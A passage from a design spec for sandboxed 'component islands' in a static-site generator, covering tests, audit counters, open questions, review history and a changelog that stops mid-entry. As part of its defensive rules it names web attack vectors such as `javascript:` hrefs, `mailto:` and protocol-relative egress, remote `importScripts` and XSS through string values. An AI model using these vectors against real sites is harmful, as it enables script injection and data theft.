**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5030]], [[SPEC-050-component-islands-and-messaging#REQ-5005]], [[SPEC-050-component-islands-and-messaging#REQ-5021]]. Positive: a single island's messages are processed in send order (per-island FIFO); each `update`/replay carries a strictly-monotonic `seq`; processing is atomic (a subscriber notified during fan-out never observes a half-applied store). **Drop detection:** a rapid burst on one topic coalesced by REQ-5021 → the subscriber sees a `seq` **gap** (knows it skipped, by how much), values never reordered. **Replay idempotency:** an SPA remount (REQ-5017) re-delivers the current value with its `seq` → an island that tracked "applied through N" does not double-apply. Negative-input: two islands publishing the same topic → resolved by arrival order only (no cross-island ordering asserted); a test MUST NOT depend on which island "won" except via last-value-wins. Negative-output: `seq` is strictly increasing per session with no duplicates; **no Lamport/vector clock is present** (assert it is a single host-assigned counter, not a per-island logical timestamp).

### TEST-5023: Session-Persistent Bus Across SPA Nav
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5023]], [[SPEC-050-component-islands-and-messaging#REQ-5007]]. Positive: navigating from an island page to a no-island page keeps the **same** `window.zetl` instance (not torn down, not duplicated); a persisted topic still live-reflects in that session. Negative-input: a session that loads **only** no-island pages never creates `window.zetl` (only per-page pre-paint applies). Negative-output: across N navigations there is never a second bus instance, and the **emitted HTML** of each page still matches its build-time marker gate (REQ-5012) regardless of runtime bus presence.

### TEST-5024: Per-Island Hydration Strategy
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5024]], [[SPEC-050-component-islands-and-messaging#REQ-5002]]. Positive: `hydrate = "load"` hydrates on load; `"idle"` after `requestIdleCallback`; `"visible"` only when scrolled into view (and a `visible` **content island** creates its iframe + bootstrap only then — assert no iframe before scroll); `"media(...)"` only when the query matches. Negative-input: an unrecognised strategy → `island-hydrate-invalid` (build error). Negative-output: regardless of strategy, the static component HTML is present and usable/indexable **before** hydration (JS-off renders identically); a `visible`/`media` island never hides page-essential content behind hydration.

### TEST-5011: Topic Grammar
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5011]], [[SPEC-050-component-islands-and-messaging#CON-5001]]. Positive: `theme`, `search:open` accepted. Negative-input: `Theme`, `a b`, an over-long, a trailing-`-`, a non-ASCII homoglyph, or a `content`-first trusted topic → `island-topic-malformed` (and the build and runtime recognisers agree). Negative-output: a malformed runtime topic is dropped, not silently coerced.

### TEST-5012: Backward-Compatible Default
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5012]]. Positive: a no-island vault builds byte-identically to the SPEC-048 baseline (golden). Negative-input: no `window.zetl`/bus/pre-paint script when no island is used. Negative-output: an unused build is unchanged.

---

## 10. Observability

### OBS-5001: Island Wiring Graph
Per build, emit the island components, their declared `publishes`/`subscribes`, resolved
publisher→subscriber edges, and any `island-topic-unpublished`/`-undeclared` findings
(extends [[SPEC-048]] OBS-4801).
**Trace:** [[SPEC-050-component-islands-and-messaging#REQ-5008]], [[SPEC-050-component-islands-and-messaging#REQ-5009]].

### OBS-5002: Island Asset Set + Dedup Ratio
Emit the set of island scripts emitted, the dedup ratio (distinct scripts vs island
instances), and a stable hash of each, to detect nondeterminism regressions.
**Trace:** [[SPEC-050-component-islands-and-messaging#NFR-5003]].

### OBS-5003: Bound Rejections
Emit counts of the **build** errors `island-topic-malformed`, `island-topic-unpublished`,
`island-topic-undeclared`, `island-persisted-no-default`, `island-topic-type-conflict`,
`island-topic-type-invalid`, `island-content-unsandboxed`, `island-content-value-type`, `island-render-invalid`, `island-hydrate-invalid`, `csp-wildcard`,
`island-capability-ungranted`, and the `island-focus-trap` / `island-request-unapproved` warnings; plus **runtime** counters (dev console / optional debug
channel) for `island-payload-type`, `island-capability-denied` (by `denied` reason), and
`island-port-closed`, so fail-closed events are auditable. The audit wiring graph (OBS-5001)
additionally lists, per content island, its iframe-sandbox status and its granted
`(topic, direction)` capabilities.
**Trace:** [[SPEC-050-component-islands-and-messaging#REQ-5008]], [[SPEC-050-component-islands-and-messaging#REQ-5010]], [[SPEC-050-component-islands-and-messaging#REQ-5013]], [[SPEC-050-component-islands-and-messaging#REQ-5016]], [[SPEC-050-component-islands-and-messaging#REQ-5017]].

---

## 11. Composition-First Feasibility (Principle 15)

| Capability | Existing primitive attempted | Outcome / placement |
| ---------- | ---------------------------- | ------------------- |
| Per-type-once asset emission | [[SPEC-048]] REQ-4809 CSS dedup/emission model | **Compose** — islands reuse the same dedup + determinism path ([[SPEC-050-component-islands-and-messaging#REQ-5001]]) |
| Hydration marker | [[SPEC-048]] `data-z="<name>"` component marker | **Compose** — hydrate `data-z` nodes; no new marker ([[SPEC-050-component-islands-and-messaging#REQ-5001]]) |
| Persistent client runtime | [[SPEC-028]] SPA shell (already nav-surviving) | **Extend** — add `store`/`bus` to the existing shell, not a per-island module ([[SPEC-050-component-islands-and-messaging#ADR-5001]]) |
| Manifest topic fields | [[SPEC-048]] CON-4801 manifest (keys reserved there) | **Extend** — activate `publishes`/`subscribes`/`[island]` ([[SPEC-050-component-islands-and-messaging#CON-5002]]) |
| Wiring audit | [[SPEC-048]] OBS-4801 component stats | **Extend** — add the island wiring graph ([[SPEC-050-component-islands-and-messaging#REQ-5009]]) |
| Retained replay-store | *(none)* | **New** — the genuinely new runtime; justified because no existing primitive survives SPA re-hydration ([[SPEC-050-component-islands-and-messaging#ADR-5002]]) |
| Untrusted-island isolation | platform `<iframe sandbox>` (opaque origin) | **Compose (platform)** — the browser's own sandbox is the isolation primitive; no custom sandbox built ([[SPEC-050-component-islands-and-messaging#REQ-5015]], [[PROTO-001]] Simplicity-Ladder rung 3) |
| Sandbox↔bus channel | platform `MessageChannel` + `postMessage` | **Compose (platform)** — transferred port *is* the capability; parent is the reference monitor ([[SPEC-050-component-islands-and-messaging#REQ-5016]]) |
| Payload recognition | the `[island.topics]` type + a small recogniser | **New** — a deliberately tiny type language (CON-5005), the LangSec recogniser for runtime messages ([[SPEC-050-component-islands-and-messaging#REQ-5013]]) |
| Hydration timing | platform `requestIdleCallback` / `IntersectionObserver` / `matchMedia`, vocabulary from [[Astro Islands]] `client:*` | **Compose (platform + prior art)** — thin wrappers over platform APIs, names borrowed from a proven framework ([[SPEC-050-component-islands-and-messaging#REQ-5024]], [[SPEC-050-component-islands-and-messaging#ADR-5009]]) |
| Cross-island state model | [[Nano Stores]] (Astro's shared-module approach) | **Diverge (with reason)** — adopt its replay-on-subscribe *semantics* but a shell bus not a shared module, because the untrusted iframe tier cannot import a shared module ([[SPEC-050-component-islands-and-messaging#ADR-5001]]) |

Net new surface is confined to (a) the ≤ 4 KiB shell bus runtime (`store`/`bus` + the
capability-bridge reference monitor), (b) the inline persisted-topic pre-paint script, and
(c) the small topic-type recogniser. Realm isolation and the sandbox↔bus channel reuse
**platform** primitives (`<iframe sandbox>`, `MessageChannel`) rather than anything bespoke;
everything else composes [[SPEC-048]] and [[SPEC-028]].

---

## 12. Open Questions

- **Q1 — Persisted-default / FOUC mechanism.** *Resolved (v0.5.0):* the normative shape is
  fixed by [[SPEC-050-component-islands-and-messaging#REQ-5018]] (static, self-contained,
  `try/catch`-defaulting, `sha256`-CSP, applied as a DOM signal) and
  [[SPEC-050-component-islands-and-messaging#ADR-5005]]; REQ-5018's clauses are stable
  normative SHALLs, no longer `[Blocked]`. *Left to IMPL-050:* the exact data-island encoding
  that keeps the script bytes (and thus the CSP hash) constant across pages with different
  persisted-topic sets.
- **Q2 — Sandboxed content-author islands.** *Resolved (v0.2.0):* content islands are
  **permitted, in an `<iframe sandbox>` with a capability-scoped bridge**
  ([[SPEC-050-component-islands-and-messaging#REQ-5010]],
  [[SPEC-050-component-islands-and-messaging#REQ-5015]],
  [[SPEC-050-component-islands-and-messaging#REQ-5016]],
  [[SPEC-050-component-islands-and-messaging#ADR-5003]]), superseding the strawman's
  forbid-only stance. *Further resolved (v0.9.0):* the **Worker variant is now the default**
  (REQ-5025/ADR-5010, after [[amp-script]]/[[worker-dom]]); the iframe is the opt-in full-DOM
  escape hatch. *Left to IMPL-050:* iframe auto-resize ergonomics for the escape-hatch path.
- **Q3 — Typed topic payloads.** *Resolved (v0.2.0):* topics are **typed**; the bus, the
  persisted-read path, and the bridge recognise every payload against a small declared type
  ([[SPEC-050-component-islands-and-messaging#REQ-5013]],
  [[SPEC-050-component-islands-and-messaging#CON-5005]]). *Still open:* whether the type
  language needs nested/record shapes beyond the v1 flat-record cap.
- **Q4 — Bus residence.** Does the bus + bridge reference-monitor live inside the existing
  SPEC-028 shell module or a new sibling shell module? Determines load order vs the
  pre-paint script.
- **Q5 — Delivery/ordering guarantees. *Resolved (v0.16.0) — implemented.*** The reference
  implementation ships the **value-change-only relay** (REQ-5021) and **per-topic sequencing**
  (host-assigned monotonic `seq`, REQ-5030). REQ-5030 pins
  per-island FIFO, a single host total order (linearizable + causality-preserving, atomic
  per-message + synchronous fan-out), a host-assigned monotonic `seq` for drop-detection and
  replay-idempotency, no cross-island ordering assumption, and LWW (not a logical clock) for
  cross-tab. *Left to profiling (Phase 1):* the `postMessage`-hop **latency** budget for sandboxed
  islands — a number to profile, not a semantic.
- **Q6 — iframe cost at scale.** *Largely moot (v0.9.0):* the default content-island mode is a
  Worker, not an iframe (REQ-5025), so the per-iframe layout/memory cost only applies to the
  opt-in escape hatch. *Residual:* Worker spawn cost at scale and whether a shared Worker pool
  is worth it — ground against Phase 1 profiles.
- **Q7 — Exact trusted-island topic declaration.** The bare `window.zetl.store(topic)` API
  gives no island identity, so `island-topic-undeclared` for trusted islands is only a
  best-effort literal-string lint (REQ-5008). Should v2 add a generated per-island wrapper
  (`zetl.island("name").store(...)`) or a required metadata export so the check becomes
  exact for trusted islands too? (`[Blocked: Q7]`.)
- **Q8 — Controlled-element content islands.** *Resolved (v0.9.0):* **adopted as the default**
  content-island mode ([[SPEC-050-component-islands-and-messaging#REQ-5025]],
  [[SPEC-050-component-islands-and-messaging#ADR-5010]]) — a Worker emitting a host-rendered
  element tree, closing Threat M by construction; the iframe is the opt-in escape hatch. *Left
  to IMPL-050:* the exact element/attribute allowlist vocabulary and the element-tree wire
  shape (extend CON-5006).
- **Q9 — Mode-aware consolidation pass.** *Resolved (v0.10.0):* every content-island clause is
  now explicitly mode-aware — REQ-5016 is a transport-agnostic reference monitor (Worker handle
  default / iframe bootstrap escape hatch); CON-5006 states one shared message protocol with the
  handle differing by transport (+ the `render` element-tree message); REQ-5017 teardown is
  `worker.terminate()` (default) or close-port+destroy-iframe (escape hatch); Threats I/J are
  marked escape-hatch-only (the Worker has no escape/spoofing surface); NFR-5002 bounds island
  *runtime* (re)creations; CON-5002 gained the `render` field (`worker` default / `iframe`).
  The iframe machinery the four reviews hardened is retained verbatim but scoped to the escape
  hatch. *Left to IMPL-050:* the element/attribute allowlist vocabulary and the `tree` wire
  shape.
- **Q10 — Worker same-origin storage (IndexedDB/Cache) is not CSP-gated.** A content Worker keeps
  ambient same-origin storage that no CSP directive restricts (REQ-5010 residual). v1 accepts it
  as *local* (not direct egress) but it forms a **staged covert channel** with a later same-origin
  context that has egress. Options for v2: serve untrusted content from a **separate origin** (the
  only real storage partition the platform offers), a storage-clearing teardown, or accept-and-
  document. Ground against the operator-deployment profile in Phase 1. (`[Blocked: Q10]`.)
- **Q11 — Mutation/patch render protocol. *Resolved (v0.16.0) — v1 choice implemented.*** v1
  dynamic updates **re-send the full element tree** per change and the host **keyed-reconciles**
  it (REQ-5029) — simple, one message shape, adequate for
  CON-5007-bounded trees, and this is the implemented v1 behaviour. A v2 `op:"patch"` protocol
  (insert/remove/set-attr/set-text ops keyed
  by node path) would avoid re-sending a large unchanged surface; it remains a deferred future
  optimisation worth doing only if profiling shows full-tree re-send is a bottleneck for real
  islands. (`[Deferred: v2]`.)

---

## 13. Convergence Status

**NOT converged — and the fourth pass shows why AI review alone cannot certify this.** Four
fresh-context adversarial reviews ([[PROTO-001]] Principle 12), each driving a revision:
**Sonnet** (14 → v0.3.0); **Opus** (v0.3.0 fixes *relocated*; 14 → v0.4.0); **cross-family
codex** (8 → v0.5.0); and a **fourth pass (Opus, fresh)** which found 2 Blocking / 5 Major / 6
Minor — including that the v0.5.0 bootstrap fix had **relocated** again (REQ-5016's
child-ready-first model left the old "no handshake" text un-retracted in CON-5006/ADR-5008/
Threat J) and **two genuinely new** axes the prior three passes never reached: **M-4**
(recognition is type-safety, not output-safety → a conformant `string` value is an XSS path
through the sanctioned bridge) and **M-5** (the per-page "iff island" invariant is false under
the session-persistent SPA shell). All resolved in **v0.6.0** (REQ-5022 + Threat M producer/
subscriber safety; REQ-5023 session-runtime model; the unified one-ceremony bootstrap;
WindowProxy routing map; AST lint; etc.).

The **security architecture has converged and is stable** across all four passes (realm
isolation + capability port + null-prototype structured-clone recognition) — and, as the
v0.7.0/v0.8.0 prior-art research confirmed, it is **not a novel architecture**: it is the
established "untrusted-code-in-a-sandbox + capability-scoped host bridge" pattern shipped by
[[Shopify Remote DOM]], [[SES]]/[[Endo]]/[[CapTP]], [[amp-script]]/[[worker-dom]], and the
[[Penpal]]/[[Comlink]] RPC plumbing. That *raises* confidence: the design follows proven
systems, so the remaining work is verification against them, not invention. What keeps
surfacing across passes is **specification-text debt** — each fix, layered on the last, leaves
a stale clause or unstated obligation the next clean context finds (relocation + new axes at
pass four), so **the adversary is not yet exhausted**. Honest conclusion: further AI passes
have **diminishing returns and a real relocation risk**; the right terminal gate is a **human
security expert** plus **executable fuzzing/PoC** of the bridge (structured-clone protocol,
the `event.source` bootstrap, teardown races) and the type recogniser — benchmarked against
the prior-art implementations above (esp. Remote DOM and SES/CapTP) — not another model review. Before Phase 2
this spec also needs: Phase 1 profiles to ground every `[Provisional]` (timeout/retry, debounce,
bounds, the iframe-creation cap) and close Q4/Q5/Q6/Q7; feasibility spikes for the ≤ 4 KiB bus
and the bridge against the [[SPEC-028]] shell; and IMPL-050 to pin the grammars, bounds, sandbox
token set + `sha256` CSP, the data-island pre-paint encoding, and the lifecycle. It depends on
[[SPEC-048]] and [[SPEC-049]] and gates independently of both.

**v0.9.0–v0.10.0 changed the recommended direction and then consolidated it** (ADR-5010): the
default content-island surface is now the [[Shopify Remote DOM]]-style Worker +
controlled-element model, which *removes* most of the bridge surface the four reviews hardened
(no `null` origin, no bootstrap race) and closes Threat M by construction. v0.9.0 introduced
that as a second model (carrying temporary two-model debt); **v0.10.0 completed the Q9
consolidation** — every content-island clause (REQ-5016/5017, CON-5002/5006, Threats A/I/J,
NFR-5002, Orientation) is now explicitly mode-aware, with the worker bridge/lifecycle/bounds
first-class and the iframe machinery scoped as the escape hatch. So the spec is now both *closer
to the right architecture* and *back to single-model text coherence*.

**The fifth pass (v0.11.0) targeted the Worker model — and it was the most consequential yet.**
The first four passes ran against the iframe design; a fresh-context pass on the now-default
Worker model found **3 Blocking + 5 Major**, all confirming that v0.9.0 had **oversold**
"Threat M closed by construction": (B1) the allowlist that the claim depends on was *deferred to
IMPL and fail-open* — so the safety theorem's premise was unspecified; (B2) the `render` `tree`
is *recursive* but reused the explicitly *non-recursive* CON-5005 recogniser, with no bounds and
no cycle handling (structured-clone tree-bomb / infinite loop); (B3) switching off the iframe
*silently deleted its CSP*, leaving the Worker with ambient `fetch`/`importScripts` — so a
consciously-granted `subscribe theme` became a five-line **exfiltration** channel. v0.11.0 fixes
all of it: **CON-5007** makes the renderer/allowlist a normative, fail-closed, URL-scheme-
validating, bounded, cycle-aware contract (Threat M now holds *iff* CON-5007 holds, stated
plainly); **REQ-5026 + Threat N** restore Worker egress confinement (blob-worker `connect-src
'none'`, integrity pin, no remote `importScripts`) and a render-rate bound; a **`paints` grant**
puts `render` inside the capability model; framing/ADR clauses (ADR-5003, §1.2, Principle 5,
§1.4) retracted the stale iframe-only teaching. **This is the lesson of the whole arc in one
pass:** a "by construction" claim is only as strong as the construction you actually specify —
moving to a simpler architecture deleted controls, and asserting their absence as a *strength*
(ADR-5010's "no storage at all") hid a live exfil channel.

**The sixth pass (v0.12.0) proved that point again — on v0.11.0's *own* fix.** A fresh
cross-model pass (checked against MDN's Worker-CSP semantics) found the B3 egress fix was
**unimplementable as written**: there is **no "inline CSP" in a Worker** — a blob/same-origin
Worker *inherits the host-document CSP*, and static/`file://` output has no per-worker response
header, so a same-document Worker cannot be given a stricter network policy than the page.
Worse, v0.11.0 had put the egress allowlist in the *untrusted author's* manifest (self-widening),
and missed that the **host-painted `<img src>` is itself an egress channel** the worker's CSP
can't see. v0.12.0 corrects all three: egress is a **host-document CSP** (meta-settable,
page-wide, trusted-operator-owned — no per-worker policy, no author field); the renderer channel
is closed by `img-src`/`media-src` CSP **plus** a **CON-5007 egress-taint rule** (a read-granted
island may emit only same-origin URLs); SRI is mode-aware (Workers use a hash-before-`new Worker`
pin); and the "no storage" claim is retracted (IndexedDB/Cache are real and un-CSP-gated —
Q10). **NOT converged, and the trend is the lesson:** six passes, and each fix to the
content-island confinement has needed the next pass to catch a browser-primitive subtlety the
previous one got wrong (inline-CSP that doesn't exist, author-set egress, renderer-as-egress).
This is precisely the class of error that **only a human security expert with a running PoC**
should sign off — the confinement rests on exact CSP/Worker/`file://` behaviour that prose
review keeps mis-stating. The terminal gate is unchanged and now urgent: human review +
executable fuzzing of (a) the CON-5007 renderer (full XSS matrix incl. SVG/CSS/mXSS), (b) the
recursive `tree` recogniser (depth/breadth/cycle), (c) Worker + renderer egress under a granted
subscribe across served **and** `file://` deploys. AI review has materially improved this spec —
visibly, across six passes — but should **not** certify it.

**v0.13.0** closed the one remaining *specification-level* gap the egress model had — *where the
policy is defined*. REQ-5027 turns "the operator ships a CSP" into a concrete, **fail-closed**
pipeline (declared in `[security.csp]`, computed default-deny ∪ widenings, emitted as `<meta>` +
headers, audited per page, mandatory for content-island pages). That was a config-design gap
prose *can* close, and it is closed. What remains is purely the **enforcement-verification** gap:
whether the emitted CSP + taint rule + recogniser actually hold against a real browser across
served and `file://` — which only the PoC + human expert can settle. So the spec is now
*complete enough to build a PoC against*, which is the right next step rather than a seventh prose
pass.

**v0.16.0 — a reference implementation now exists, and the pattern held.** A complete reference
implementation landed (PR #65, branch `feat/spec-049-050-content-islands`), behind the default-on
`component-islands` feature with byte-identical defaults; it passed clippy, ~2,535 lib tests,
integration suites, LangSec property/fuzz tests, and node-based runtime tests for the JS reference
monitor. But the §13 lesson held one more time: **five further post-implementation review rounds**
(2 fresh-context adversarial + 3 Codex) each surfaced a **real boundary bug**, all since fixed
with a regression test — **egress via `mailto:` / an obfuscated scheme / a slash-mix
protocol-relative URL through the renderer; an ungranted trusted subscribe accepted from a
manifest; `srcdoc`/`xlink:href` gaps in the content-prop context lint (SPEC-049 CON-4904); an
`unsubscribe` that leaked the underlying store subscription; and a publisher/subscriber topic
type-conflict that was only checked publisher-side.** Conclusion: status is now **`implemented`**
(behind flags, byte-identical default), but the untrusted-island boundary is **NOT declared
converged** — the repeated post-implementation bypass pattern is itself the evidence — and
production reliance still requires a **dedicated human security review + executable fuzzing** of
the bridge, the CON-5007 renderer/egress-taint rule, and the type/grant model.

---

## Changelog

<details>
<summary>Revision history — 0.1.0 → 0.16.0</summary>

- **0.16.0** (2026-06-26) — *reference implementation landed (PR #65).* A complete reference
  implementation now exists on `feat/spec-049-050-content-islands`, behind the default-on
  `component-islands` cargo feature, with **byte-identical backward-compatible defaults**; it passed
  clippy, ~2,535 lib tests, integration suites, LangSec property/fuzz tests, and node-based runtime
  tests for the JS reference monitor. Normative hardening recorded after **five post-implementation
  review rounds** (2 fresh-context adversarial + 3 Codex), each of which found a genuine boundary
  bug since fixed with a regression test: **grant-gated trusted subscribes** (a content island may
  subscribe a trusted topic ONLY with a matching `[[theme.island-grants]]` entry — a manifest
  listing is not enough; ungranted ⇒ fatal `island-capability-ungranted`, CON-5002);
  **all-declarations type-conflict** (publisher/subscriber type mismatch is fatal
  `island-topic-type-conflict`, because the runtime registers `data-island-types` from every
  mounted island and last-writer-wins would make validation hydration-order-dependent, REQ-5013);
  **`unsubscribe` release** (MUST release the underlying store subscription and free the global
  subscriber-budget slot, not merely clear debounce state, REQ-5016/CON-5006); **parse-and-assess
  URL egress** (the CON-5007 renderer validates URLs by `new URL(value, pageBase)` + `.protocol`/
  `.origin`, never regex; a read-granted island may emit only same-origin/relative URLs — any
  non-`http(s)` scheme such as `mailto:`, any cross-origin or protocol-relative URL / all slash
  mixes blocked). **Resolved Q5** (value-change-only relay + per-topic sequencing implemented) and
  **Q11** (v1 re-sends the full element tree, host keyed-reconciles). **Status → implemented**
  (behind flags, byte-identical default); the untrusted-island boundary is **NOT declared
  converged** and still needs a dedicated **human security review + executable fuzzing** (see §13).

- **0.15.0** (2026-06-25) — *message ordering + sequencing (resolves Q5's ordering half).* New
  **REQ-5030 + TEST-5030**: per-island FIFO; a **single host total order** (linearizable +
  causality-preserving because the bus is the sole inter-island channel; atomic per-message
  processing + synchronous fan-out); a **host-assigned monotonic `seq`** on every `update`/replay
  (CON-5006) for **drop-detection** (coalescing gaps become visible) and **replay/remount
  idempotency** (dedup "applied through N"); explicit **no cross-island ordering** assumption
  (coordinate via the retained store); cross-tab stays **LWW**. Records — per the design
  discussion — that a **Lamport/vector clock is deliberately not used**: with a single serializer
  the `seq` counter is a *total* order (stronger than a logical clock's partial order), and the
  one genuine multi-serializer case (cross-tab) needs a CRDT to *merge*, not a clock to *order*;
  `seq` is a single-writer counter, not a distributed timestamp. Q5's remaining half is just the
  `postMessage`-latency number (Phase 1 profiling).

- **0.14.0** (2026-06-25) — *the author's side of the permission model + the dynamic-update
  model.* **REQ-5028 + TEST-5028 + `[island.requests]`:** a content-island author can now
  *declare* the capabilities they want — `connect-src` hosts, vendored `bundles`, a `reason` —
  but the request is **inert until the operator approves** it in `[security.csp]` (fail-closed,
  mirrors the topic `subscribes`→grant flow and extension/Snaps permission manifests); the build
  surfaces each request + `approved`/`unapproved` status in the audit graph (REQ-5009); libraries
  are **bundled into the integrity-pinned bytes**, not fetched at runtime (no CDN path). Honest
  caveat recorded: CSP enforcement is page-wide, so requests improve *governance/auditability*,
  not per-island *enforcement* isolation (that needs separate origins, Q10). **REQ-5029 +
  TEST-5029 + `key`:** the dynamic-update model — zetl ships **no VDOM framework** (NFR-5002);
  instead the host runs a **tiny keyed reconciler** and islands update by **re-emitting a full
  `render` tree**, which the host keyed-diffs to minimal DOM mutations (preserving focus/input/
  scroll on keyed nodes). Any VDOM lib the author wants lives **in the worker** (bundled). Added a
  `key` field to the CON-5007 tree; a v2 mutation/patch protocol is deferred (Q11).

- **0.13.0** (2026-06-25) — *closes the "where is the egress policy defined?" gap.* v0.12.0 said
  "the operator ships a host-document CSP" but never defined the declaration site, computation, or
  emission — so the guarantee was non-actionable and the default was fail-**open**. New
  **REQ-5027 + TEST-5027**: the CSP is declared in site config **`[security.csp]`** (+ theme
  manifest; never a content-author field); the build **computes** each page's policy as a
  **default-deny baseline ∪ declared widenings** (baseline for a content-island page includes
  `connect-src 'none'`, `worker-src 'self' blob:`, `img-src 'self'`, the island/pre-paint `sha256`
  hashes); **fail-closed** — absent `[security.csp]` yields the baseline, not "no CSP", and a
  content-island page with no policy is a build error; `*` sources are rejected (`csp-wildcard`).
  Emitted as a **`<meta http-equiv>`** (first `<head>` child; authoritative on static/`file://`)
  **plus a byte-equal served-headers artifact**, and recorded **per-page in the audit graph**
  (REQ-5009) so egress is diffable. Also fixed the **stale TEST-5026** (still used v0.11.0's
  removed blob-worker/`connect-src=[]` framing) → now tests the host-document CSP across all three
  Threat-N channels (direct fetch / importScripts / renderer `<img src>`). REQ-5026 egress bullet
  now points at REQ-5027 for the declaration site.

- **0.12.0** (2026-06-25) — *sixth pass: corrects v0.11.0's egress fix (3 Blocking / 3 Major),
  checked against MDN Worker-CSP semantics.* **B1:** the "blob worker with inline CSP" mechanism
  **does not exist** — a blob/same-origin Worker *inherits the host-document CSP*, and static/
  `file://` has no per-worker response header, so a same-document Worker cannot be confined more
  tightly than the page. REQ-5026 rewritten: egress is the **host-document CSP** (meta-settable
  for static; worker inherits it), no per-worker policy. **B2:** removed `connect-src` from the
  (untrusted) content-island manifest — egress widening is a **trusted theme/operator** page-CSP
  decision, surfaced in the audit graph; an author cannot widen their own egress. **B3:** the
  host-painted `<img src>` is itself an egress channel the worker CSP can't see → closed by
  `img-src`/`media-src` CSP **plus** a new **CON-5007 egress-taint rule** (a read-granted island
  may emit only same-origin URLs). **Majors:** TEST-5010/TEST-5020 de-iframe'd (both modes);
  REQ-5019/TEST-5019 SRI made mode-aware (Workers use a hash-before-`new Worker` pin, since SRI
  doesn't apply); the "Worker has no storage" claim retracted in REQ-5010/ADR-5010 (IndexedDB/
  Cache are real and un-CSP-gated) + new residual + **Q10**. §13 records the arc: six passes, each
  catching a CSP/Worker browser-primitive subtlety the prior fix mis-stated — the terminal gate
  (human expert + running PoC) is now urgent, not optional. Honest residual: on `file://`,
  confinement is best-effort.

- **0.11.0** (2026-06-25) — *fifth adversarial pass: the Worker model (3 Blocking / 5 Major / 5
  Minor), all applied.* The pass confirmed v0.9.0 **oversold** "Threat M closed by construction."
  **B1:** the allowlist the claim depends on was deferred-to-IMPL and fail-open → new **CON-5007**
  makes the renderer normative: closed default-deny element set, **per-attribute URL/value
  grammars** (not name-only — closes `href="javascript:…"`), `style`/`on*`/`is` forbidden,
  `setAttribute`/`textContent` only, **fail-closed on a missing allowlist**, single HTML
  namespace. **B2:** the recursive `tree` reused the non-recursive CON-5005 recogniser → CON-5007
  specifies a **distinct bounded cycle-aware** recogniser (depth/breadth/node/byte caps; rejects
  cyclic clones), counted against NFR-5002. **B3:** the Worker had ambient `fetch`/`importScripts`
  (the iframe CSP was dropped) → new **REQ-5026 + Threat N**: blob-worker `connect-src 'none'`,
  integrity-pinned script, no remote `importScripts`, render-rate bound; Threat K corrected (a
  granted read is local *only if* egress is confined). **Majors:** `render` now needs a `paints`
  grant (M2); `sandbox` scoped to iframe mode + `paints`/`connect-src` worker-mode fields (M3,
  CON-5002/REQ-5008); REQ-5020 a11y rewritten for both modes (M4); TEST-5025 expanded to the full
  vector matrix + TEST-5026 added (M5). **Minors:** ADR-5003 marked superseded + Worker-rejection
  retracted (m1); §1.2/Principle 5/§1.4 re-threaded off iframe-only (m2); dedicated-Worker pinned
  (m3); REQ-5025 trace fixed (m4); `props` grammar in CON-5007 (m5). §13 records the arc's lesson:
  a "by construction" claim is only as strong as the construction you specify.

- **0.10.0** (2026-06-25) — *consolidation (closes Q9); no new normative direction.* Re-threaded
  every content-island clause to be **explicitly mode-aware** so the spec no longer carries two
  overlapping models: **REQ-5016** is now a transport-agnostic reference monitor (Worker-handle
  default / iframe-bootstrap escape hatch); **CON-5006** states one shared message protocol with
  the island handle differing by transport, plus the `render` element-tree message; **REQ-5017**
  teardown is `worker.terminate()` (default) or close-port+destroy-iframe (escape hatch);
  **Threats I/J** are marked escape-hatch-only (the Worker has no escape/spoofing surface);
  **Threat A** covers both modes; **NFR-5002** bounds island *runtime* (re)creations;
  **CON-5002** gained the `render` field (`worker` default / `iframe`) + `island-render-invalid`;
  Orientation diagram/decisions/load-bearing updated. The iframe machinery the four reviews
  hardened is retained verbatim, scoped as the escape hatch. §13 notes the now-default Worker
  model still owes its **own** fresh-context adversarial pass (the prior four targeted the iframe
  design). *Left to IMPL-050:* the element/attribute allowlist + `tree` wire shape.

- **0.9.0** (2026-06-25) — *design change, drawn from the v0.8.0 prior art.* Adopted the
  **[[Shopify Remote DOM]] / [[worker-dom]] model as the default content-island surface**
  (ADR-5010, REQ-5025): a **Web Worker** that emits a **host-rendered controlled element tree**
  rather than a sandboxed iframe rendering its own DOM. This (1) **closes Threat M by
  construction** — untrusted code never emits HTML, only a declarative tree the host paints
  with an allowlist; (2) **dissolves the hardest bridge problems** the four reviews fought —
  a `Worker` has no `"null"` origin, no `event.source` ambiguity, no port-transfer race, no
  `contentWindow` routing map (the REQ-5016 bootstrap machinery is now iframe-escape-hatch
  only); (3) renders inline with page CSS (no iframe layout pain, Q6). The sandboxed `<iframe>`
  (REQ-5015) is retained as an **opt-in full-DOM escape hatch**. REQ-5010 recharacterised
  (two render modes); Threat M, Q2, Q8 updated; TEST-5025 added; **Q9 tracks the consolidation
  debt** — the iframe-specific clauses still need to be made explicitly mode-aware. This is the
  most consequential improvement the prior-art study produced.

- **0.8.0** (2026-06-25) — *correction; prior-art research (`ar-crawl`).* **Retracts the v0.7.0
  "the untrusted content-island half has no prior art" claim** — it was wrong. The sandbox +
  capability-scoped-host-bridge pattern is established and shipping: **[[Shopify Remote DOM]]**
  (untrusted sandboxed code renders a controlled UI to the host — the closest twin),
  **[[SES]]/[[Endo]]/[[CapTP]]** object-capability confinement + capability-transport (the
  [[Google Caja]] lineage; powers [[MetaMask Snaps]]), **[[amp-script]]/[[worker-dom]]** (worker
  variant of Q2), and **[[Penpal]]/[[Comlink]]** (postMessage RPC). §1.2 and §13 rewritten:
  the *mechanism* is proven, only the *application* (markdown components in a static-site
  generator) is new — which raises confidence and points IMPL-050 at real systems to benchmark
  against. Added **Q8** — Remote DOM's controlled-element model would close Threat M *by
  construction* (untrusted code never emits raw HTML), a stronger guarantee than v1's
  producer-restriction; evaluate for v2. No normative requirement change.

- **0.7.0** (2026-06-25) — *additive; prior-art grounding from [[Astro Islands]]* (researched
  via `ar-crawl` over the Astro docs). Added **REQ-5024 + ADR-5009** per-island **hydration
  strategy** (`load`/`idle`/`visible`/`media`) modelled on Astro's `client:*` directives —
  `visible` defers a content island's entire iframe+bootstrap until scrolled into view;
  `hydrate` manifest field (CON-5002), `island-hydrate-invalid` error, TEST-5024. Grounded the
  existing design in prior art: **ADR-5001** now explains the shell-bus-vs-shared-module choice
  via Astro's [[Nano Stores]] (the shared-module pattern is correct for trusted-only; SPEC-050
